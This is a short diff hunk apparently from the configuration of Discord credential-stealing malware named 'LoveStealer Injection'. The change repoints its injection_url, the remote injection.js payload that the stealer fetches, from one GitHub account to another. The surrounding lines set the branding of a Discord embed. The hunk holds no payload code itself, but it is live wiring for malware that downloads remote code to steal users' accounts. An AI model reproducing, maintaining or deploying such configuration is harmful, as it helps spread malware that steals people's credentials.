@@ -14,7 +14,7 @@ const config = {
   embed_name: 'LoveStealer Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1230434578045603922/1231814121717239868/lovestl.png?ex=66272fcc&is=6625de4c&hm=f2b2eb87e5eaade5d35beca68f0e986785d3bc3e2144d371f0cbc9ac8818521c&=&format=webp&quality=lossless'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/LoveStealer/loves/main/injection.js', 
   /**
    
    **/
